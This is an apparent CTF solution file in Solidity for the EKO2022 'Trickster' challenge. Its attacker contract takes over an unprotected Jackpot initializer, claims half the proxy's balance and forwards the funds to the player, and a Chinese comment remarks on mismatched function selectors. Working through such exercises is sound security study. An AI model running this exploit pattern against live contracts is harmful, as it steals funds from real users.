// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {JackpotProxy, Jackpot} from "../../src/eko2022/03_Trickster/Trickster.sol";

contract Trickster_Attacker {
	address player;
	JackpotProxy jackpotProxy;
	Jackpot jackpot;
	
	constructor(JackpotProxy jackpotProxy_, Jackpot jackpot_) payable {
		player = msg.sender;
		jackpotProxy = jackpotProxy_;
		jackpot = jackpot_;
	}
	
	receive() external payable {}
	
	function doAttack() public {
		bytes4 claimPrizeValue1 = bytes4(keccak256("claimPrize(uint)"));
		console.logBytes4(claimPrizeValue1);
		bytes4 claimPrizeValue2 = Jackpot.claimPrize.selector;
		console.logBytes4(claimPrizeValue2);
		
		// 注意，这两个函数选择器的值，完全不相同哦!!!
		require(claimPrizeValue1 != claimPrizeValue2);
		
		uint256 claimAmount = address(jackpotProxy).balance / 2;
		require(address(this).balance >= claimAmount);
		
		jackpot.initialize{value: 0}(address(this));
		jackpot.claimPrize(claimAmount);
		
		(bool success, ) = player.call{value: address(this).balance}("");
		require(success);
	}
}
